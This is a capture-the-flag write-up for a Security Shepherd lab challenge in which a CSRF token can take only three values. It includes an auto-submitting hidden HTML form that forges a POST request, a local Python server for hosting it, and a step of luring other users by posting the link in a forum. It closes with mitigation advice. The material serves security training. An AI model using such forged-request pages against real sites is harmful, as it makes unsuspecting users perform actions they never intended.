# Cross Site Request Forgery Challenge Five

## Description
`POST /user/csrfchallengefive/plusplus`
With the following parameters: `userId=your_user_id & csrfToken=csrf_token`

Where your_user_id is the ID of the user whose CSRF counter is being incremented. Your ID is: `3297ff70ad130c5b6858593e2087452b0d2afe71`. Any user other than you may increment your counter for this challenge.

## Solution
This challenge introduces a rotating CSRF token system with only three possible values (0, 1, 2). Although it appears to have some protection, the limited token space makes it vulnerable to brute force attacks.

From examining the page source, we can see that different users encounter different CSRF token values (0, 1, or 2). We need to create our exploit with one of these values and wait for a matching user to visit our page.

![](/writeups/assets/images/csrf/csrf-5-0.jpg)
![](/writeups/assets/images/csrf/csrf-5-1.jpg)
![](/writeups/assets/images/csrf/csrf-5-2.jpg)

## Steps to Reproduce

### 1 Step
Fill in your HTML file with the necessary information:
- userid: `3297ff70ad130c5b6858593e2087452b0d2afe71`
- csrfToken: Set to one of the possible values (0, 1, or 2)
- shepherd-domain: where Shepherd is running (in this example, localhost)

```html
<form name="malForm" action="https://localhost/user/csrfchallengefive/plusplus" method="POST">
    <input type="hidden" name="userId" value="3297ff70ad130c5b6858593e2087452b0d2afe71"/>
    <input type="hidden" name="csrfToken" value="1"/>
    <input type="submit"/>
</form>
<script> document.malForm.submit(); </script>
```

### 2 Step
Run your server using Python's built-in HTTP server:

```bash
python3 -m http.server 8080
```

### 3 Step
Post your URL to the forum and wait for other users to visit. Since there are only three possible token values, you have a 1 in 3 chance of matching with any visiting user.

## Exploit
When another user visits your page, if their current CSRF token matches the one in your form, the request will succeed and increment your counter.

## Impact
This vulnerability demonstrates how a weak CSRF protection mechanism with a small token space can be easily bypassed through brute force techniques.

## Mitigation
To properly implement CSRF protection:
- Use cryptographically secure random tokens with sufficient entropy
- Generate unique tokens for each user session
- Validate tokens on the server side for all sensitive operations
- Implement proper token expiration mechanisms
- Consider using the SameSite cookie attribute as an additional defense layer

---

[← Previous](./csrf-4.md) | [Next →](./csrf-6.md)

